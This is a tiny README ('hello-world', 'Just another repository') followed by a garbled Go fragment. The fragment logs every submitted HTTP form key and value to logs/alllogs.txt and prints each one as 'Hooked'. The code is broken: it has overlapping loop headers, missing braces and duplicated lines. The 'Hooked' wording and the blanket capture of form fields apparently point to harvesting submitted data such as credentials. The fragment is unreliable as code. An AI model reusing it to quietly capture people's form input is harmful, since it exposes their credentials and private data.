# hello-world
Just another repository
logf, err := os.OpenFile("logs/alllogs.txt", os.O_APPEND|os.O_WRONLY, 0644)
checkerr(err)
defer logf.Close()
for _, values := range req.Form { // range over map
for key, values := range req.Form { // range over map
for _, value := range values { // range over []string
logf.WriteString(value + "\n")
fmt.Println("Hooked value " + value)
logf.WriteString(key + " " + value + "\n")
fmt.Println("Hooked key " + key + " Value " + value)
